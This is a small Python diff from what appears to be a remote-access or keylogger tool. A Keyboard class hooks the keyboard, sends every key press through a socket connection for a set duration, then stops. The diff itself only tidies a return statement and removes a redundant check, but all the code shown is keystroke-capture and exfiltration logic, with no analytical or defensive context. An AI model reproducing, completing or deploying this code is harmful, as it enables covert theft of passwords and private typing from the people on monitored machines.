@@ -22,13 +22,11 @@ class Keyboard(object):
 			try:
 				socketClient.sendall(data)
 			except:
-				return None
+				return
 		
 		self.__hook = HookManager()
 		self.__hook.HookKeyboard()
 		self.__hook.KeyDown = sendKey
-		if self.__hook == None:
-			return
 		self.__hook.start()
 		time.sleep(size)
 		self.__hook.cancel()
